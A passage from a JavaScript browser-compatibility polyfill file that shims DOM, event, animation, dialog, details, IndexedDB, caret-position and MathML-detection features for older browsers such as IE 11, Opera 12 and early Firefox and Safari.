  Object.defineProperty(Node.prototype, "parentElement", {
    get: function () {
      var parentNode = this.parentNode;
      return parentNode != null && parentNode.nodeType === Node.ELEMENT_NODE ? parentNode : null;
    }
  });
}

if (typeof CustomEvent !== 'function') { // Note: CustomEvent, not Event, as typeof Event === 'function' on Android 4.4 while the Event constructor does not work
  var nativeEventPrototype = Event.prototype;
  window.Event = function (type, options) {
    var event = document.createEvent("Event");
    event.initEvent(type, options != null && options.bubbles ? true : false, options != null && options.cancelable ? true : false);
    return event;
  };
  window.Event.prototype = nativeEventPrototype;
}

if (typeof CustomEvent !== 'function') { // IE 11
  window.CustomEvent = function (type, options) {
    var event = new Event(type, options);
    event.details = options.details;
    return event;
  };
  window.CustomEvent.prototype = Object.create(Event.prototype);
}

// IE 11
if (typeof Window !== "undefined" && Window.prototype.navigate != null && Window.prototype.navigate.length === 0 && window.opera == null) {
  delete Window.prototype.navigate;
}

if (true) {
  var img = new Image();
  img.onerror = function () {
    img.onerror = img.onload = null;
    // IE 11 does not support 22 3C 3E 5B 5C 5D 5E 60 7B 7C 7D 7F, Edge 12 does not support 22 5C 5E 60 7C 7F
    // https://stackoverflow.com/a/45517927/839199
    var iterateCSS = function (f) {
      var styleSheets = document.styleSheets;
      for (var i = 0; i < styleSheets.length; i += 1) {
        var styleSheet = styleSheets[i];
        var cssRules = styleSheet.cssRules;
        for (var j = 0; j < cssRules.length; j += 1) {
          var cssRule = cssRules[j];
          if (cssRule.type === CSSRule.STYLE_RULE) {
            var style = cssRule.style;
            var propertyValue = style.getPropertyValue('background-image');
            if (propertyValue !== '' && propertyValue !== 'none') {
              //console.log(propertyValue);
              var match = /^url\("data\:([^,]+),([\s\S]+)"\)$/.exec(propertyValue);
              if (match != null) {
                var mimeType = match[1];
                var data = match[2].replace(/\\"/g, '\"');
                var value = 'url("data:' + mimeType + ',' + encodeURIComponent(decodeURIComponent(data)) + '")';
                style.setProperty('background-image', value, '');
              }
            }
          }
        }
      }
    };
    iterateCSS();
  };
  img.onload = function () {
    img.onerror = img.onload = null;
  };
  img.src = 'data:image/svg+xml,<svg width="1" height="1" viewBox="0 0 1 1" xmlns="http://www.w3.org/2000/svg" data-x="|"></svg>';
}

if (!("requestAnimationFrame" in window)) {
  (function () {
    var queue = [];
    var k = 0;
    window.requestAnimationFrame = window.mozRequestAnimationFrame ||
                                   window.webkitRequestAnimationFrame || function (callback) {
      if (queue.length === k) {
        window.setTimeout(function () {
          k = queue.length;
          for (var i = 0; i < k; i += 1) {
            try {
              queue[i]();
            } catch (error) {
              window.setTimeout(function (error) {
                throw error;
              }.bind(null, error), 0);
            }
          }
          queue.splice(0, k);
          k = 0;
        }, k === 0 ? 0 : 1000 / 60);
      }
      queue.push(callback);
    };
  }());
}

if (window.history.replaceState == null) {
  if (window.History != null) {
    // Firefox 3.6
    window.History.prototype.replaceState = function (state, title, href) {
      window.location.replace(href + (href.indexOf('#') === -1 ? '#' : ''));
    };
  } else {
    window.history.replaceState = function (state, title, href) {
      window.location.replace(href + (href.indexOf('#') === -1 ? '#' : ''));
    };
  }
}

// Firefox 3.6
var tmp =  document.createElement('tmp');
tmp.innerHTML = '<math></math>';
if (tmp.firstElementChild != null && tmp.firstElementChild.namespaceURI !== 'http://www.w3.org/1998/Math/MathML') {
  Object.defineProperty(Element.prototype, "namespaceURI", {
    get: function () {
      return this.tagName.toLowerCase().charCodeAt(0) === "m".charCodeAt(0) && !/^(main|map|mark|menu|menuitem|meta|meter)$/.test(this.tagName.toLowerCase()) ? "http://www.w3.org/1998/Math/MathML" : "http://www.w3.org/1999/xhtml";
    }
  });
  // XMLSerializer - ?
}

// Opera 12
if (HTMLInputElement.prototype.setRangeText == null) {
  HTMLInputElement.prototype.setRangeText = function (text) {
    this.value = this.value.slice(0, this.selectionStart) + text + this.value.slice(this.selectionEnd);
  };
}

// Opera 12
if (HTMLTextAreaElement.prototype.setRangeText == null) {
  HTMLTextAreaElement.prototype.setRangeText = function (text) {
    this.value = this.value.slice(0, this.selectionStart) + text + this.value.slice(this.selectionEnd);
  };
}

function supportsMutilinePlaceholder() {
  // Firefox < 59 (according to https://bugzilla.mozilla.org/show_bug.cgi?id=1391044) - undetectable (as does not affect scrollHeight)
  if (!('overscrollBehavior' in document.documentElement.style)) {//Firefox 59?
    return false;
  }
  return window.opera == null;//TODO:
}

var placeholderListener = function (event) {
  var backgroundImage = event.target.value.length !== 0 ? 'none' : event.target.getAttribute('data-background-image');
  if (event.target.style.backgroundImage !== backgroundImage) {
    event.target.style.backgroundImage = backgroundImage;
  }
};

var property = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'placeholder');
if (!supportsMutilinePlaceholder() && (property == null || property.configurable)) {
  // the placeholder property is not configurable on Safari 9
  Object.defineProperty(HTMLTextAreaElement.prototype, 'placeholder', {
    get: function () {
      return this.getAttribute('aria-placeholder') || '';
    },
    set: function (value) {
      this.removeEventListener('input', placeholderListener, false);
      this.addEventListener('input', placeholderListener, false);
      //var style = getComputedStyle(this, null);
      var fontSize = 15;//Number.parseFloat(style.fontSize);
      var lineHeight = 1.2 * fontSize;
      this.setAttribute('aria-placeholder', value);
      var lines = value.split('\n');
      var width = 0;
      for (var i = 0; i < lines.length; i += 1) {
        width = Math.max(width, lines[i].length);
      }
      var svg = '';
      svg += '<svg xmlns="http://www.w3.org/2000/svg" width="' + (width * fontSize) + '" height="' + (lineHeight * lines.length) + '" viewBox="0 0 ' + (width * fontSize) + ' ' + (lineHeight * lines.length) + '" font-size="' + fontSize + '" font-family="monospace" fill="silver">';
      for (var i = 0; i < lines.length; i += 1) {
        svg += '<text x="2" y="' + (lineHeight * (i + 0.5)) + '" dy="0.25em">';
        svg += lines[i].replace(/\s/g, '\xA0');
        svg += '</text>';
      }
      svg += '</svg>';
      //this.style.backgroundSize = (width * fontSize) + 'px' + ' ' + (lineHeight * lines.length) + 'px';
      this.style.backgroundImage = 'url(\'data:image/svg+xml,' + encodeURIComponent(svg) + '\')';
      this.style.backgroundRepeat = 'no-repeat';
      //this.style.backgroundOrigin = 'content-box';
      this.setAttribute('data-background-image', this.style.backgroundImage);
      placeholderListener.call(this, {target: this});
    }
  });
}

}());



//TODO: ?
if (window.matchMedia == undefined) {
  window.matchMedia = function () {
    return {matches: false, addListener: function () {}, removeListener: function () {}};
  };
}

//TODO: ?
if (window.matchMedia("(any-pointer: fine)").media !== "(any-pointer: fine)") {//TODO: ?
  var nativeMatchMedia = window.matchMedia;
  window.matchMedia = function (media) {
    media = media.replace(/^\s+|\s+$/g, '').replace(/\s+/g, '').replace(/\:/g , ': ');
    if (media === "(any-pointer: fine)" || media === "(pointer: fine)" || media === "(any-hover: hover)" || media === "(hover: hover)") {
      // https://stackoverflow.com/a/29509267/839199
      var isMobile = /iPhone|iPad|iPod|Android/i.test(window.navigator.userAgent);
      return {matches: !isMobile, addListener: function () {}, removeListener: function() {}};
    }
    return nativeMatchMedia.call(window, media);
  };
}

/*global IDBObjectStore*/

// Edge 18 - ?
// Safari < 10.1
if (typeof IDBObjectStore !== 'undefined' &&
    IDBObjectStore.prototype != undefined &&
    (IDBObjectStore.prototype.getAll == undefined || IDBObjectStore.prototype.getAllKeys == undefined || IDBObjectStore.prototype.openKeyCursor == undefined)) {
  var get = function (store, query, count, value) {
    'use strict';
    var request = {
      onsuccess: undefined
    };
    var result = [];
    var cursorRequest = query == undefined ? (value ? store.openCursor() : store.openKeyCursor()) : (value ? store.openCursor(query) : store.openKeyCursor(query));
    cursorRequest.onsuccess = function (event) {
      var cursor = event.target.result;
      if (cursor != undefined) {
        result.push(value ? cursor.value : cursor.key);
        if (count == undefined || result.length < count) {
          cursor['continue']();
        }
      } else {
        request.onsuccess({target: {result: result}});
      }
    };
    return request;
  };
  if (IDBObjectStore.prototype.getAll == undefined) {
    IDBObjectStore.prototype.getAll = function (query, count) {
      'use strict';
      return get(this, query, count, true);
    };
  }
  if (IDBObjectStore.prototype.getAllKeys == undefined) {
    IDBObjectStore.prototype.getAllKeys = function (query, count) {
      'use strict';
      return get(this, query, count, false);
    };
  }
  if (IDBObjectStore.prototype.openKeyCursor == undefined) {
    IDBObjectStore.prototype.openKeyCursor = function (range, direction) {
      'use strict';
      // Edge 17 throws an exception for "store.openCursor(undefined)"
      return range == undefined && direction == undefined ? this.openCursor() : (direction == undefined ? this.openCursor(range) : this.openCursor(range, direction));
    };
  }
}

/*global document, window, Element */

(function () {
  "use strict";

  var hasCompositeAddSupport = function () {
    if (true) {
      return typeof KeyframeEffect !== 'undefined' && 'composite' in KeyframeEffect.prototype;
      //return false;//! to not cause layout recalculation/rendering
    }
    var ok = false;
    if (document.body != undefined) {
      var tmp = document.createElement("div");
      tmp.style.position = "absolute";
      tmp.style.overflow = "hidden";
      tmp.style.width = "1px";
      tmp.style.height = "1px";
      document.body.appendChild(tmp);
      tmp.style.opacity = "0";
      try {
        for (var i = 0; i < 2; i += 1) {
          tmp.animate([
            {opacity: "0.25"},
            {opacity: "0.50"}
          ], {
            duration: 1000,
            composite: "add"
          });
        }
      } catch (error) {
        // an error in Chrome < ?
        window.console.log(error);
      }
      ok = window.getComputedStyle(tmp, undefined).opacity === "0.5";
      tmp.parentNode.removeChild(tmp);
    }
    return ok;
  };

  var nativeAnimate = Element.prototype.animate;
  var nativeAnimations = [];
  var setAnimationStyles = function (element, keyframes, options) {
    var k = 0;
    var oldAnimation = undefined;
    for (var i = 0; i < nativeAnimations.length; i += 1) {
      var x = nativeAnimations[i];
      if (x.element === element) {
        oldAnimation = x.animation;
      } else {
        nativeAnimations[k] = x;
        k += 1;
      }
    }
    while (nativeAnimations.length > k) {
      nativeAnimations.pop();
    }
    if (keyframes != undefined) {
      var newAnimation = nativeAnimate.call(element, keyframes, options);
      nativeAnimations.push({
        element: element,
        animation: newAnimation
      });
    }
    if (oldAnimation != undefined) {
      //Note: cancel is needed to remove the animation from the list of element's animations (especially, if `fill` is "both")
      oldAnimation.cancel();
    }
  };

  var cubicBezier = function (a, b, t) {
    return 3 * a * (1 - t) * (1 - t) * t + 3 * b * (1 - t) * t * t + t * t * t;
  };

  var cubic = function (x, error, a, b, c, d) {
    var start = 0;
    var end = 1;
    while (end - start > error) {
      var middle = (start + end) / 2;
      var e = cubicBezier(a, c, middle);
      if (e < x) {
        start = middle;
      } else {
        end = middle;
      }
    }
    return cubicBezier(b, d, start);
  };

  var easeInOut = function (x, error) {
    return cubic(x, error, 0.42, 0, 0.58, 1);
  };

  var animations = [];

  var interpolateValues = function (a, b, p) {
    return (1 - p) * a + p * b;
  };

  var addValues = function (a, b) {
    return a + b;
  };

  function Transform(name, arg) {
    this.name = name;
    this.arg = arg;
  }

  Transform.prototype.toString = function () {
    return this.name + "(" + this.arg.toString() + (this.name !== "scale" ? "px" : "") + ")";
  };

  Transform.parseTransform = function (transform) {
    var match = /^\s*([a-zA-Z]+)\(([^\),]+)\)\s*$/.exec(transform);
    if (match == undefined) {
      throw new Error();
    }
    var name = match[1];
    var arg = Number.parseFloat(match[2]);
    return new Transform(name, arg);
  };

  function Keyframe(opacity, transform) {
    this.opacity = opacity;
    this.transform = transform;
  }

  Keyframe.parseKeyframe = function (style) {
    var opacity = style.opacity == undefined || style.opacity === "" ? undefined : Number.parseFloat(style.opacity);
    var transform = style.transform == undefined || style.transform === "" ? undefined : Transform.parseTransform(style.transform);
    return new Keyframe(opacity, transform);
  };

  Keyframe.prototype.interpolate = function (keyframe, p) {
    var opacity = undefined;
    if (this.opacity != undefined || keyframe.opacity != undefined) {
      opacity = interpolateValues(this.opacity != undefined ? this.opacity : 1, keyframe.opacity != undefined ? keyframe.opacity : 1, p);
    }
    var transform = undefined;
    if (this.transform != undefined || keyframe.transform != undefined) {
      if (this.transform == undefined && keyframe.transform == undefined && this.transform.name !== keyframe.transform.name) {
        throw new Error();
      }
      var name = this.transform != undefined ? this.transform.name : keyframe.transform.name;
      transform = new Transform(name, interpolateValues(this.transform != undefined ? this.transform.arg : (name === "scale" ? 1 : 0), keyframe.transform != undefined ? keyframe.transform.arg : (name === "scale" ? 1 : 0), p));
    }
    return new Keyframe(opacity, transform);
  };

  Keyframe.prototype.add = function (keyframe, composite) {
    var opacity = keyframe.opacity == undefined ? this.opacity : (this.opacity == undefined || composite !== "add" ? keyframe.opacity : addValues(this.opacity, keyframe.opacity));
    var transform = keyframe.transform == undefined ? this.transform : (this.transform == undefined || composite !== "add" ? keyframe.transform : new Transform(this.transform.name, this.transform.name === "scale" ? this.transform.arg * keyframe.transform.arg : addValues(this.transform.arg, keyframe.transform.arg)));
    return new Keyframe(opacity, transform);
  };

  Keyframe.prototype.toJSON = function () {
    // no way to use undefined (Chrome) or "" (Firefox)
    if (this.opacity == undefined && this.transform != undefined) {
      return {
        transform: this.transform != undefined ? this.transform.toString() : ""
      };
    }
    if (this.opacity != undefined && this.transform == undefined) {
      return {
        opacity: this.opacity != undefined ? this.opacity.toString() : ""
      };
    }
    if (this.opacity != undefined && this.transform != undefined) {
      return {
        opacity: this.opacity != undefined ? this.opacity.toString() : "",
        transform: this.transform != undefined ? this.transform.toString() : ""
      };
    }
    return {};
  };

  var generateKeyframes = function (element, startTime, endTime) {
    var style = Keyframe.parseKeyframe(element.style);
    var keyframes = [];
    for (var time = startTime; time < endTime; time += 1000 / 60) {
      var value = style;
      for (var i = 0; i < animations.length; i += 1) {
        var a = animations[i];
        if (a.element === element) {
          var timeFraction = (time - a.startTime) / a.duration;
          if (timeFraction < 0) {
            timeFraction = 0;
          }
          if (timeFraction > 1) {
            timeFraction = 1;
          }
          var p = easeInOut(timeFraction, 1000 / 60 / a.duration / 32);
          var frame0 = value.add(a.keyframes[0], a.composite);
          var frame1 = value.add(a.keyframes[1], a.composite);
          value = frame0.interpolate(frame1, p);
        }
      }
      keyframes.push(value.toJSON());
    }
    return keyframes;
  };

  var startTime = 0;

  if (nativeAnimate != undefined && !hasCompositeAddSupport()) {
    Element.prototype.animate = function (frames, keyframeEffectOptions) {
      if (startTime === 0) {
        startTime = Date.now();
        window.setTimeout(function () {
          startTime = 0;
        }, 0);
      }
      var now = startTime;
      var keyframes = [];
      for (var j = 0; j < frames.length; j += 1) {
        keyframes.push(Keyframe.parseKeyframe(frames[j]));
      }
      var element = this;
      var animation = {
        element: element,
        keyframes: keyframes,
        duration: keyframeEffectOptions.duration,
        composite: keyframeEffectOptions.composite,
        startTime: now
      };
      animations.push(animation);
      var endTime = 0;
      for (var i = 0; i < animations.length; i += 1) {
        if (animations[i].element === element) {
          var animationEndTime = animations[i].startTime + animations[i].duration;
          if (endTime < animationEndTime) {
            endTime = animationEndTime;
          }
        }
      }
      var animationKeyframes = generateKeyframes(element, now, endTime);
      setAnimationStyles(element, animationKeyframes, {duration: endTime - now, easing: "linear"}); // fill: "both" - ?
      window.setTimeout(function () {
        var k = 0;
        var active = 0;
        for (var i = 0; i < animations.length; i += 1) {
          if (animations[i] !== animation) {
            if (animations[i].element === element) {
              active += 1;
            }
            animations[k] = animations[i];
            k += 1;
          }
        }
        animations.length = k;
        if (active === 0) {
          setAnimationStyles(element, undefined, undefined);
        }
      }, animation.duration);
      return animation;
    };
  }

}(this));

/*global document, window, Element, Event */

function hasDialogElementSupport() {
  "use strict";
  var dialog = document.createElement('dialog');
  return dialog.showModal != undefined;
}

if (!hasDialogElementSupport() && Element.prototype.initDialog == undefined) {
(function () {
  "use strict";

  function Inert() {
  }
  Inert.observers = [];
  Inert.dialogs = [];
  Inert.f = function (tabIndex) {
    return -42 - tabIndex;
  };
  Inert.toggleInert = function (node, dialog, value) {
    if (!dialog.contains(node)) {
      if ((value && node.tabIndex >= 0) || (!value && node.tabIndex <= Inert.f(0))) {
        node.tabIndex = Inert.f(node.tabIndex);
      }
      var c = node.firstElementChild;
      while (c != null) {
        Inert.toggleInert(c, dialog, value);
        c = c.nextElementSibling;
      }
    }
  };
  Inert.push = function (dialog) {
    Inert.toggleInert(document.body, dialog, true);
    if (window.MutationObserver != undefined) {
      var observer = new window.MutationObserver(function (mutations) {
        for (var i = 0; i < mutations.length; i += 1) {
          var mutation = mutations[i];
          var addedNodes = mutation.addedNodes;
          for (var j = 0; j < addedNodes.length; j += 1) {
            Inert.toggleInert(addedNodes[j], dialog, true);
          }
          var removedNodes = mutation.removedNodes;
          for (var k = 0; k < removedNodes.length; k += 1) {
            Inert.toggleInert(removedNodes[k], dialog, false);
          }
        }
      });
      observer.observe(document.body, {
        childList: true,
        characterData: false,
        subtree: true
      });
      Inert.observers.push(observer);
    }
    Inert.dialogs.push(dialog);
  };
  Inert.pop = function () {
    var dialog = Inert.dialogs.pop();
    if (window.MutationObserver != undefined) {
      var observer = Inert.observers.pop();
      observer.disconnect();
    }
    Inert.toggleInert(document.body, dialog, false);
  };

  var setFocus = function (dialog) {
    var autofocus = dialog.querySelector("[autofocus]");
    if (autofocus != null) {
      autofocus.focus();
    } else {
      dialog.focus(); // as in Chrome
    }
  };

  var show = function () {
    if (this.getAttribute("open") == null) {
      this.setAttribute("open", "open");
      setFocus(this);
    }
  };

  var showModal = function () {
    if (this.getAttribute("open") == null) {
      this.setAttribute("data-modal", "data-modal");
      this.setAttribute("open", "open");
      Inert.push(this);
      setFocus(this);
    }
  };

  var close = function (returnValue) {
    if (this.getAttribute("open") != null) {
      if (this.getAttribute("data-modal") != null) {
        this.removeAttribute("data-modal");
        Inert.pop();
      }
      this.removeAttribute("open");
      this.returnValue = returnValue;
      // bugs.chromium.org/p/chromium/issues/detail?id=380087 - close event was sync in Chrome 49 and is async now
      window.setTimeout(function () {
        this.dispatchEvent(new Event("close"));
      }, 0);
    }
  };

    Element.prototype.initDialog = function () {
      document.body.classList.toggle("no-dialog", true);//!
      var dialog = this;
      dialog.setAttribute("role", "dialog");
      dialog.show = show;
      dialog.showModal = showModal;
      dialog.close = close;
      dialog.returnValue = undefined;
      dialog.addEventListener("keydown", function (event) {
        var DOM_VK_ESCAPE = 27;
        if (event.keyCode === DOM_VK_ESCAPE && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
          event.preventDefault();
          if (this.dispatchEvent(new Event("cancel", {cancelable: true}))) {
            this.close(undefined);
          }
        }
      }, false);
      dialog.addEventListener("submit", function (event) {
        event.preventDefault();
        this.close(event.target.getAttribute("value"));
      }, false);
    };

}());
}

/*global document, Element*/

(function () {
  "use strict";

  var details = document.createElement('details');
  var summary = document.createElement('summary');
  details.appendChild(summary);
  if (!("open" in details)) {
    document.addEventListener('DOMContentLoaded', function (event) { // document.body is null in Opera 12
      document.body.classList.toggle("no-details-summary", true);
    }, {once: true});
  }
  if ((!("open" in details) || !("ontoggle" in details) || summary.tabIndex === -1) && Element.prototype.initDetails == null) {
    Element.prototype.initDetails = function (summary) {
      var details = this;
      //var summary = details.firstElementChild;
      if (summary.tagName.toLowerCase() !== 'summary') {
        throw new RangeError("Unexpected " + summary.tagName.toLowerCase());
      }
      details.setAttribute("role", "group");
      summary.setAttribute("aria-expanded", "false");// Note: on <summary>
      summary.setAttribute("role", "button");
      summary.tabIndex = 0;
      summary.addEventListener("click", function (event) {
        var summary = this;
        var details = summary.parentNode;
        event.preventDefault();
        var isOpen = details.getAttribute("open") != undefined;
        if (!isOpen) {
          summary.setAttribute("aria-expanded", "true");// Note: on <summary>
          details.setAttribute("open", "open");
        } else {
          details.setAttribute("aria-expanded", "false");
          details.removeAttribute("open");
        }
        summary.focus();
        var e = document.createEvent("Event");
        e.initEvent("toggle", false, false);
        details.dispatchEvent(e);
      }, false);
      // role="button" => click should be fired with SPACE key too
      summary.addEventListener("keydown", function (event) {
        var DOM_VK_SPACE = 32;
        if (event.keyCode === DOM_VK_SPACE && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
          event.preventDefault(); // scrolling
        }
        var DOM_VK_RETURN = 13;
        if (event.keyCode === DOM_VK_RETURN && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
          event.preventDefault();
          this.click();
        }
      }, false);
      summary.addEventListener("keyup", function (event) {
        var DOM_VK_SPACE = 32;
        if (event.keyCode === DOM_VK_SPACE && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
          event.preventDefault();
          this.click();
        }
      }, false);
    };
  }

}());

/*global document, window, Element, HTMLInputElement, CSS */

(function () {
  "use strict";

  // a bug in Chrome 47 on Windows - 67 - ?
  // Seems, it is not more reproduciable on Chrome >= 78
  // https://bugs.chromium.org/p/chromium/issues/detail?id=652102
  // window.devicePixelRatio - Firefox 3.6.28 throws on usage of the getter or setter(?)
  if (Object.getOwnPropertyDescriptor != undefined && window.devicePixelRatio != null) {
    var lastDevicePixelRatio = 0;
    var lastScrollLeftFix = 1;
    var originalScrollLeft = undefined;
    try {
      originalScrollLeft = Object.getOwnPropertyDescriptor(Element.prototype, "scrollLeft");
    } catch (error) {
      // NS_ERROR_XPC_BAD_CONVERT_JS: Could not convert JavaScript argument in Firefox 17
      window.console.log(error);
    }
    var isChrome78 = typeof CSS !== 'undefined' && CSS.supports != null && CSS.supports('(width: min(1px, 2px))');
    if (originalScrollLeft != undefined && originalScrollLeft.get != undefined && originalScrollLeft.set != undefined && !isChrome78) { // Safari < 10, Opera 12
      Object.defineProperty(HTMLInputElement.prototype, "scrollLeft", {
        get: function () {
          if (this.tagName.toLowerCase() !== 'input') {
            return originalScrollLeft.get.call(this);
          }
          if (lastDevicePixelRatio !== window.devicePixelRatio) {
            lastDevicePixelRatio = window.devicePixelRatio;
            var input = document.createElement("input");
            document.body.appendChild(input);
            input.style.position = "absolute";
            input.style.height = "1px";
            input.style.width = "1px";
            input.style.overflow = "hidden";
            input.value = "xxxxxxxxxxxxxxx";
            originalScrollLeft.set.call(input, 16383);
            var s = originalScrollLeft.get.call(input);
            if (s === 0) { // IE - Edge
              lastScrollLeftFix = 1;
            } else {
              lastScrollLeftFix = (input.scrollWidth - input.clientWidth) / s;
              if (lastScrollLeftFix === 0) { // Edge/18.18362 (input.scrollWidth === input.clientWidht)
                lastScrollLeftFix = 1;
              }
              if ((1 - lastScrollLeftFix) * (1 - lastScrollLeftFix) < 0.05 * 0.05) {
                lastScrollLeftFix = 1;
              }
            }
            input.parentNode.removeChild(input);
          }
          // lastScrollLeftFix equals window.devicePixelRatio in Chrome 49 - 53
          return lastScrollLeftFix * originalScrollLeft.get.call(this);
        },
        set: function (value) {
          originalScrollLeft.set.call(this, value);
        }
      });
    }
  }

}());

// Firefox < 20, Chrome, Edge, Opera, Safari
if (document.caretPositionFromPoint == undefined) {

  var createElementLikeInput = function (input, contentCallback, callback) {
    "use strict";
    var inputStyle = window.getComputedStyle(input, undefined);

    var scrollLeft = input.scrollLeft;
    var scrollTop = input.scrollTop;

    var inputRect = input.getBoundingClientRect();

    var div = document.createElement("div");
    contentCallback(div);
    div.style.position = "absolute";
    div.style.display = "inline-block";

    div.style.margin = "0px";
    div.style.border = "0px solid transparent";

    div.style.paddingLeft = inputStyle.paddingLeft;
    div.style.paddingRight = inputStyle.paddingRight;
    div.style.paddingTop = inputStyle.paddingTop;
    div.style.paddingBottom = inputStyle.paddingBottom;

    div.style.left = (inputRect.left + window.pageXOffset + input.clientLeft).toString() + "px";
    div.style.top = (inputRect.top + window.pageYOffset + input.clientTop).toString() + "px";
    div.style.width = input.clientWidth.toString() + "px";
    div.style.height = input.clientHeight.toString() + "px";

    if ("boxSizing" in div.style) {
      div.style.boxSizing = "border-box";
    }
    if ("MozBoxSizing" in div.style) {
      div.style.MozBoxSizing = "border-box";
    }
    if ("webkitBoxSizing" in div.style) {
      div.style.webkitBoxSizing = "border-box";
    }

    div.style.whiteSpace = input.tagName.toLowerCase() === 'input' ? 'nowrap' : 'pre';
    div.style.wordWrap = inputStyle.wordWrap;

    // Firefox does not like font
    div.style.fontSize = inputStyle.fontSize;
    div.style.fontFamily = inputStyle.fontFamily;
    div.style.overflow = "hidden";
    div.style.visibility = "visible"; // Opera 12 needs visible
    div.style.zIndex = "100000";//?

    document.body.appendChild(div);
    div.scrollLeft = scrollLeft;
    div.scrollTop = scrollTop;
    var result = callback(div);
    div.parentNode.removeChild(div);
    return result;
  };

  document.caretPositionFromPoint = function (x, y) {
    "use strict";
    var element = document.elementFromPoint(x, y);
    if (element.tagName.toLowerCase() !== 'input' &&
        element.tagName.toLowerCase() !== 'textarea') {
      var caretRange = document.caretRangeFromPoint(x, y);
      return {
        offsetNode: caretRange.startContainer,
        offset: caretRange.startOffset
      };
    }
    var input = element;
    var offset = createElementLikeInput(input, function (div) {
      var value = input.value.replace(/\r\n/g, "\n") + "\n"; // IE - \r\n
      div.textContent = value;
    }, function () {
      return document.caretRangeFromPoint(x, y).startOffset;
    });
    return {
      offsetNode: input,
      offset: offset
    };
  };

  var hasSetSelectionRangeScrollToVisibilityBug = function (callback) {
    var input = document.createElement('input');
    input.style.position = 'fixed';
    input.style.left = '-20px';
    input.style.top = '-2em';
    input.style.width = '10px';
    input.style.height = '1em';
    input.style.opacity = '0';
    input.style.overflow = 'hidden';
    input.value = 'x'.repeat(1000);
    document.documentElement.appendChild(input);
    window.requestAnimationFrame(function () {
      var activeElement = document.activeElement;
      input.focus();
      input.scrollLeft = 0;
      input.setSelectionRange(999, 1000);
      if (activeElement != null) {
        activeElement.focus();
      } else {
        input.blur();
      }
      window.setTimeout(function () {
        var ok = input.scrollLeft !== 0;
        callback(!ok);
        window.requestAnimationFrame(function () {
          document.documentElement.removeChild(input);
        });
      }, 1000);
    });
  };

  // Chrome 80
  // https://bugs.chromium.org/p/chromium/issues/detail?id=331233
  if (HTMLInputElement.prototype.createTextRange == null &&
      HTMLInputElement.prototype.setSelectionRange != null) {
  hasSetSelectionRangeScrollToVisibilityBug(function () {
    // Range.prototype.getBoundingClientRect is null in Opera Mini
    // Range.prototype.getBoundingClientRect isnull in Firefox < 4
    // Range#getBoundingClientRect returns null on Android 4.4
    var nativeSetSelectionRange = HTMLInputElement.prototype.setSelectionRange;
    HTMLInputElement.prototype.setSelectionRange = function (selectionStart, selectionEnd) {
      "use strict";
      nativeSetSelectionRange.call(this, selectionStart, selectionEnd);
      //var position = selectionstart;
      var input = this;
      var result = createElementLikeInput(input, function (div) {
        var span1 = document.createElement('span');
        span1.textContent = input.value.slice(0, input.selectionStart);
        div.appendChild(span1);
        var span2 = document.createElement('span');
        span2.textContent = input.value.slice(input.selectionStart, input.selectionEnd);
        div.appendChild(span2);
        var span3 = document.createElement('span');
        span3.textContent = input.value.slice(input.selectionEnd);
        div.appendChild(span3);
      }, function (div) {
        var rect = div.firstElementChild.nextElementSibling.getBoundingClientRect();
        var inputClientRect = div.getBoundingClientRect();
        return {
          scrollLeft: rect.right - inputClientRect.right,
          scrollTop: rect.bottom - inputClientRect.bottom
        };
      });
      input.scrollLeft += result.scrollLeft;
      input.scrollTop += result.scrollTop;
    };
  });
  }

}

// IE, Edge, Firefox, Opera
if (Element.prototype.scrollIntoViewIfNeeded == undefined) {
  Element.prototype.scrollIntoViewIfNeeded = function () {
    "use strict";
    // `centerIfNeeded` is not implemented
    var rect = this.getBoundingClientRect();
    if (rect.left < 0 || document.documentElement.clientWidth < rect.right ||
        rect.top < 0 || document.documentElement.clientHeight < rect.bottom) {
      this.scrollIntoView(document.documentElement.clientHeight < rect.bottom - rect.top || rect.top < 0);
    }
  };
}


/*global window, document, HTMLElement, Element */

"use strict";

(function () {
  // FrÃ©dÃ©ric Wang - https://github.com/fred-wang/mathml.css/blob/master/mspace.js
  /* This Source Code Form is subject to the terms of the Mozilla Public
   * License, v. 2.0. If a copy of the MPL was not distributed with this
   * file, You can obtain one at http://mozilla.org/MPL/2.0/. */
   /*global document, Node*/

  // layout work (?)
  var getMathMLSupport = function () {
    var tmp = document.createElement("div");
    tmp.style.position = "fixed";
    tmp.style.top = "0px"; // affects layout root in Chrome
    tmp.style.left = "0px"; // affects layout root in Chrome
    tmp.style.whiteSpace = "nowrap";
    tmp.style.width = "0px";
    tmp.style.height = "0px";
    tmp.style.overflow = "hidden";
    tmp.style.visibility = "hidden";
    tmp.style.contain = "strict";//TODO: ?
    // helper function
    var tableBody = function (rows, cols) {
      return ('<mtr>' + '<mtd><mn>0</mn></mtd>'.repeat(cols) + '</mtr>').repeat(rows);
    };
    var table = '<math><mtable id="table-4-4">' + tableBody(4, 4) + '</mtable></math>';
    var mathTest = '<math><mtable id="table-1-4">' + tableBody(1, 4) + '</mtable></math>' +
                   '<math><mtable id="table-4-1">' + tableBody(4, 1) + '</mtable></math>';
    var columnspacingTest = '<math><mtable id="columnspacing-a">' + tableBody(1, 4) + '</mtable></math>' +
                            '<math><mtable id="columnspacing-b" columnspacing="0em">' + tableBody(1, 4) + '</mtable></math>';
    var columnlinesTest = '<math><mtable id="columnlines-a">' + tableBody(1, 4) + '</mtable></math>' +
                          '<math><mtable id="columnlines-b" columnlines="none solid none">' + tableBody(1, 4) + '</mtable></math>';
    // use long number to detect increase of the width:
    var mpaddedTest = '<math><mrow id="mpadded-a"><mn>1234567890</mn></mrow></math>' +
                      '<math><mpadded id="mpadded-b" width="+1em" lspace="+1em"><mn>1234567890</mn></mpadded></math>';
    var mencloseTest = '<math><mrow id="menclose-a"><mn>1</mn></mrow></math>' +
                       '<math><menclose id="menclose-b" notation="circle"><mn>1</mn></menclose></math>';
    var rowspacingTest = '<math><mtable id="rowspacing-a">' + tableBody(4, 1) + '</mtable></math>' +
                         '<math><mtable id="rowspacing-b" rowspacing="0ex">' + tableBody(4, 1) + '</mtable></math>';
    var lspaceRspaceTest = '<math><mrow><mo id="lspace-rspace-a">-</mo><mi>1</mi></mrow></math>' +
